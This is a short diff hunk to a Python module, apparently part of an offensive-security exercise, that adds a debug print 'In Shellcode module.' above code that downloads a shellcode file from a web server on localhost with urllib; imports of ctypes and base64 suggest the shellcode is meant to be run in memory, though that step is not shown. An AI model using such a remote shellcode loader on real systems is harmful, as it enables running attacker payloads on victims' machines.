@@ -2,6 +2,8 @@ import base64
 import ctypes
 import urllib.request
 
+print("[*] In Shellcode module.")
+
 # retrieve the shellcode from our web server
 url = "http://localhost:8000/shellcode.bin"
 response = urllib.request.urlopen(url)
